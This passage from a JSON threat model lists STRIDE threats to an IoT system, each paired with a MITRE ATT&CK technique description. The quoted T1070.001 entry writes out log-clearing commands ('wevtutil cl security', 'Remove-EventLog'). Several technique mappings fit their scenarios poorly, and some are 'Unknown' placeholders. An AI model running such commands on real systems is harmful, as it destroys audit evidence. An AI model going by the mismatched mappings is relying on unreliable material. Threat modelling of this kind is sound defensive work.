                    "Condition": "The attacker has physical or remote access to the network."
                }
            ],
            "Potential Impact": "Unauthorized access to system functions and data, potentially leading to data breaches and manipulation of system behavior.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network traffic",
                "credential access",
                "malicious device"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Malicious actors fake the identity of legitimate sensors to inject false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has the ability to simulate legitimate sensor outputs.",
                    "Role": "Attacker",
                    "Condition": "The system lacks sensor validation mechanisms."
                },
                {
                    "Assumption": "The network lacks robust monitoring to detect anomalies.",
                    "Role": "System Administrator",
                    "Condition": "Anomaly detection systems are not in place or improperly configured."
                },
                {
                    "Assumption": "The attacker can intercept and alter sensor data in transit.",
                    "Role": "Attacker",
                    "Condition": "Weak or no encryption on sensor data transmissions."
                }
            ],
            "Potential Impact": "Incorrect system responses and data corruption, impacting system reliability and user safety.",
            "MITRE ATT&CK Keywords": [
                "sensor spoofing",
                "false data injection",
                "anomaly detection",
                "system manipulation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Attackers impersonate legitimate users using compromised smart cards or biometrics to access high-privilege functions.",
            "Assumptions": [
                {
                    "Assumption": "Attackers have access to stolen or forged smart cards.",
                    "Role": "Attacker",
                    "Condition": "Physical security measures are insufficient to protect smart card issuance and usage."
                },
                {
                    "Assumption": "Biometric data can be replicated or reused by attackers.",
                    "Role": "Attacker",
                    "Condition": "Biometric systems do not use anti-spoofing technologies like liveness detection."
                },
                {
                    "Assumption": "Multi-factor authentication is either not implemented or can be bypassed.",
                    "Role": "System Administrator",
                    "Condition": "Weak implementation of multi-factor authentication."
                }
            ],
            "Potential Impact": "Unauthorized actions including tampering with system settings, data breaches, and potential physical harm.",
            "MITRE ATT&CK Keywords": [
                "biometric spoofing",
                "identity theft",
                "hardware security",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Attackers physically tamper with sensors or actuators to disrupt their normal functioning.",
            "Assumptions": [
                {
                    "Assumption": "Sensors and actuators are physically accessible to attackers.",
                    "Role": "Attacker",
                    "Condition": "Insufficient physical security measures protecting devices."
                },
                {
                    "Assumption": "Tampered devices do not raise immediate alerts or are not detected quickly.",
                    "Role": "System Administrator",
                    "Condition": "Lack of adequate physical tamper detection mechanisms."
                },
                {
                    "Assumption": "Attackers have the necessary tools and knowledge to tamper with hardware components.",
                    "Role": "Attacker",
                    "Condition": "Publicly available technical specifications or previous reverse engineering of devices."
                }
            ],
            "Potential Impact": "System malfunctions leading to incorrect environment adaptation, impacting user experience and safety.",
            "MITRE ATT&CK Keywords": [
                "hardware tampering",
                "physical security",
                "sensor manipulation",
                "actuator disruption"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data in the cloud storage or databases to falsify historical data or user profiles.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has gained access to cloud storage or database systems.",
                    "Role": "Attacker",
                    "Condition": "Compromised credentials or exploitation of vulnerabilities in network security."
                },
                {
                    "Assumption": "Database systems do not have strong integrity checks or auditing enabled.",
                    "Role": "System Administrator",
                    "Condition": "Misconfiguration of database security and monitoring settings."
                },
                {
                    "Assumption": "Data is not encrypted at rest or during transmission.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust encryption protocols."
                }
            ],
            "Potential Impact": "Loss of data integrity, misleading system behavior and analysis, and potential breaches of user privacy.",
            "MITRE ATT&CK Keywords": [
                "database tampering",
                "cloud storage",
                "data integrity",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious firmware updates installed in IoT devices compromising their functionality.",
            "Assumptions": [
                {
                    "Assumption": "Attackers can distribute malicious updates via unprotected firmware update mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Firmware update processes lack integrity checks and secure transmission."
                },
                {
                    "Assumption": "Firmware updates are not authenticated or verified before installation.",
                    "Role": "System Administrator",
                    "Condition": "Lack of digital signatures or proper verification mechanisms."
                },
                {
                    "Assumption": "Users or administrators do not verify update sources.",
                    "Role": "User",
                    "Condition": "Insufficient user training and awareness."
                }
            ],
            "Potential Impact": "Unreliable device behavior, potential data theft, and disruption of key system functionalities.",
            "MITRE ATT&CK Keywords": [
                "firmware tampering",
                "malicious software update",
                "device compromise",
                "integrity check"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny performing actions that have security or privacy implications.",
            "Assumptions": [
                {
                    "Assumption": "System does not log user actions comprehensively.",
                    "Role": "System Administrator",
                    "Condition": "Lack of robust logging and monitoring features."
                },
                {
                    "Assumption": "Logs are not tamper-proof or are easily modifiable.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient log protection mechanisms like hashing or secure storage."
                },
                {
                    "Assumption": "Logs are not regularly reviewed or audited.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate security policies and procedures."
                }
            ],
            "Potential Impact": "Difficulty in forensic analysis, potential legal ramifications, and unresolved security incidents.",
            "MITRE ATT&CK Keywords": [
                "log manipulation",
                "action repudiation",
                "forensic evasion",
                "logging"
            ],
            "mitre_technique": {
                "name": "Clear Windows Event Logs",
                "description": "Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.\n\n\nWith administrator privileges, the event logs can be cleared with the following utility commands:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\nThese logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)\n\nAdversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.",
                "id": "attack-pattern--6495ae23-3ab4-43c5-a94f-5638a2c31fd2",
                "technique_id": "T1070.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Attackers mask their actions to blend in with legitimate user activity.",
            "Assumptions": [
                {
                    "Assumption": "System lacks detailed log granularity to distinguish between different types of actions.",
                    "Role": "System Administrator",
                    "Condition": "Simplified or consolidated logging entries."
                },
                {
                    "Assumption": "Legitimate user activities are not rigorously monitored for patterns.",
                    "Role": "System Administrator",
                    "Condition": "Absence of behavior analysis and anomaly detection systems."
                },
                {
                    "Assumption": "Attackers can modify or delete logs post-attack.",
                    "Role": "Attacker",
                    "Condition": "Insufficient protections on log data."
                }
            ],
            "Potential Impact": "Increased difficulty in incident detection and investigation, leading to prolonged periods of system compromise.",
            "MITRE ATT&CK Keywords": [
                "log evasion",
                "infiltration",
                "user activity masking",
                "incident investigation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users dispute unauthorized transactions or commands executed via compromised user devices.",
            "Assumptions": [
                {
                    "Assumption": "System does not use strong authentication and validation protocols for executing critical commands.",
                    "Role": "System Administrator",
                    "Condition": "Weak or single-factor authentication mechanisms."
                },
                {
                    "Assumption": "There is no transactional logging and verification for sensitive actions.",
                    "Role": "System Administrator",
                    "Condition": "Absence of a dual verification system or transaction audit trails."
                },
                {
                    "Assumption": "Users are not educated about secure device usage.",
                    "Role": "User",
                    "Condition": "Lack of user training and awareness programs."
                }
            ],
            "Potential Impact": "Financial loss, system manipulation, and difficulty in resolving disputes.",
            "MITRE ATT&CK Keywords": [
                "transaction repudiation",
                "command integrity",
                "device compromise",
                "authentication"
            ],
            "mitre_technique": {
                "name": "Use Alternate Authentication Material",
                "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. \n\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\n\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system\u2014either in memory or on disk\u2014it may be at risk of being stolen through [Credential Access](https://attack.mitre.org/tactics/TA0006) techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\n",
                "id": "attack-pattern--51a14c76-dd3b-440b-9c20-2bf91d25a814",
                "technique_id": "T1550"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted during wireless transmission between sensors and data repositories.",
            "Assumptions": [
                {
                    "Assumption": "Wireless communications are not encrypted.",
                    "Role": "System Administrator",
                    "Condition": "Absence of or weak encryption protocols."
                },
                {
                    "Assumption": "Attackers can eavesdrop on wireless communications.",
                    "Role": "Attacker",
                    "Condition": "Access to wireless network proximity."
                },
                {
                    "Assumption": "Sensitive information is transmitted without obfuscation.",
                    "Role": "System Administrator",
                    "Condition": "Raw data is sent without additional protective measures."
                }
            ],
            "Potential Impact": "Unauthorized disclosure of personal and sensitive information, privacy breaches, and potential identity theft.",
            "MITRE ATT&CK Keywords": [
                "wireless eavesdropping",
                "data interception",
                "information disclosure",
                "privacy breach"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Compromised cloud storage leads to unauthorized access to user profiles and historical data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud storage lacks strong access controls.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigurations in cloud security settings."
                },
                {
                    "Assumption": "Data is not encrypted at rest in the cloud.",
                    "Role": "System Administrator",
                    "Condition": "Encryption policies are not enforced."
                },
                {
                    "Assumption": "Attackers have credentials for cloud access.",
                    "Role": "Attacker",
                    "Condition": "Credentials obtained via phishing or other social engineering attacks."
                }
            ],
            "Potential Impact": "Exposure of sensitive user information and history, leading to potential misuse and privacy violations.",
            "MITRE ATT&CK Keywords": [
                "cloud storage",
                "access controls",
                "data exposure",
                "privacy"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Insider threat exposes sensitive environment and user data to unauthorized parties.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate access to sensitive data.",
                    "Role": "Insider",
                    "Condition": "Employee or contractor with authorized access."
                },
                {
                    "Assumption": "No monitoring of insider activities for unusual access patterns.",
                    "Role": "System Administrator",
                    "Condition": "Lack of behavior monitoring and anomaly detection systems."
                },
                {
                    "Assumption": "Insufficient data segmentation and access controls.",
                    "Role": "System Administrator",
                    "Condition": "Broad access rights without a least-privilege policy."
                }
            ],
            "Potential Impact": "Unauthorized disclosure or sale of sensitive information, resulting in data breaches and loss of trust",
            "MITRE ATT&CK Keywords": [
                "insider threat",
                "data leakage",
                "privileged access",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Hybrid Identity",
                "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.  \n\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Azure AD includes three options for synchronizing identities between Active Directory and Azure AD(Citation: Azure AD Hybrid Identity):\n\n* Password Hash Synchronization (PHS), in which a privileged on-premises account synchronizes user password hashes between Active Directory and Azure AD, allowing authentication to Azure AD to take place entirely in the cloud \n* Pass Through Authentication (PTA), in which Azure AD authentication attempts are forwarded to an on-premises PTA agent, which validates the credentials against Active Directory \n* Active Directory Federation Services (AD FS), in which a trust relationship is established between Active Directory and Azure AD \n\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges. \n\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the `AzureADConnectAuthenticationAgentService` process that authorizes all attempts to authenticate to Azure AD, as well as records user credentials.(Citation: Azure AD Connect for Read Teamers)(Citation: AADInternals Azure AD On-Prem to Cloud) In environments using AD FS, an adversary may edit the `Microsoft.IdentityServer.Servicehost` configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.(Citation: MagicWeb)\n\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Azure AD tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Azure AD environment as any user.(Citation: Mandiant Azure AD Backdoors)",
                "id": "attack-pattern--54ca26f3-c172-4231-93e5-ccebcac2161f",
                "technique_id": "T1556.007"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A network-based DDoS attack causes disruption in communication between IoT components.",
            "Assumptions": [
                {
                    "Assumption": "The network is susceptible to DDoS attacks.",
                    "Role": "Attacker",
                    "Condition": "Lack of DDoS mitigation services or measures."
                },
                {
                    "Assumption": "Network lacks adequate bandwidth management and redundancy.",
                    "Role": "System Administrator",
                    "Condition": "Insufficient network infrastructure planning."
                },
                {
                    "Assumption": "Attackers can generate high-volume traffic.",
                    "Role": "Attacker",
                    "Condition": "Access to botnets or other amplification methods."
                }
            ],
            "Potential Impact": "Disruption of real-time data exchange, delayed system responses, and potential failure of critical services.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network disruption",
                "traffic overload",
                "service outage"
            ],
            "mitre_technique": {
                "name": "Network Denial of Service",
                "description": "Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see [Endpoint Denial of Service](https://attack.mitre.org/techniques/T1499).",
                "id": "attack-pattern--d74c4a7e-ffbf-432f-9365-7ebf1f787cab",
                "technique_id": "T1498"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious firmware or software updates cause devices to enter a non-functional state.",
            "Assumptions": [
                {
                    "Assumption": "Attacker can push unauthorized updates.",
                    "Role": "Attacker",
                    "Condition": "Insufficient authentication and verification of updates."
                },
                {
                    "Assumption": "System lacks rollback or recovery mechanisms for failed updates.",
                    "Role": "System Administrator",
                    "Condition": "No failsafe or backup firmware versions."
                },
                {
                    "Assumption": "Devices do not maintain basic functionality when updates fail.",
                    "Role": "System Administrator",
                    "Condition": "Critical operations cease during update failures."
                }
            ],
            "Potential Impact": "Complete shutdown of affected devices, leading to a halt in system functionalities and user dissatisfaction.",
            "MITRE ATT&CK Keywords": [
                "malicious update",
                "device failure",
                "firmware",
                "software update"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Exploitation of zero-day vulnerabilities in network infrastructure components causing network failures.",
            "Assumptions": [
                {
                    "Assumption": "Network devices have unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Delay or failure in applying security updates."
                },
                {
                    "Assumption": "Attackers have knowledge of these vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Zero-day vulnerabilities are known to malicious actors."
                },
                {
                    "Assumption": "Intrusion detection systems are not effectively identifying or blocking such exploits.",
                    "Role": "System Administrator",
                    "Condition": "IDS/IPS systems are outdated or misconfigured."
                }
            ],
            "Potential Impact": "Network downtime, disrupted communication between IoT components, and potential compromise of data transmission.",
            "MITRE ATT&CK Keywords": [
                "zero-day",
                "vulnerability exploitation",
                "network failure",
                "IDS/IPS"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits vulnerabilities in system software to gain administrative privileges.",
            "Assumptions": [
                {
                    "Assumption": "System software has exploitable vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Lack of timely patching and updates."
                },
                {
                    "Assumption": "Attackers have physical or network access to exploit vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Network or physical security controls are insufficient."
                },
                {
                    "Assumption": "Insufficient logging and monitoring of privileged operations.",
                    "Role": "System Administrator",
                    "Condition": "Lack of detailed monitoring and auditing of administrative actions."
                }
            ],
            "Potential Impact": "Complete control over the system by attackers, allowing them to manipulate data and functionalities, leading to potential breaches or misuse.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "admin access",
                "system control"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious insiders use their legitimate access to elevate their privileges beyond what is authorized.",
            "Assumptions": [
                {
                    "Assumption": "Insider has legitimate, though restricted, access to the system.",
                    "Role": "Insider",
                    "Condition": "Employee or contractor accidentally or intentionally misusing their access."
                },
                {
                    "Assumption": "Access management policies are weak or inconsistently enforced.",
                    "Role": "System Administrator",
                    "Condition": "Lack of strict access controls based on least privilege."
                },
                {
                    "Assumption": "Privileged actions are not logged or monitored.",
                    "Role": "System Administrator",
                    "Condition": "Absence of regular monitoring and auditing."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and functionalities, causing potential data leaks, fraud, or system misuse.",
            "MITRE ATT&CK Keywords": [
                "insider threat",
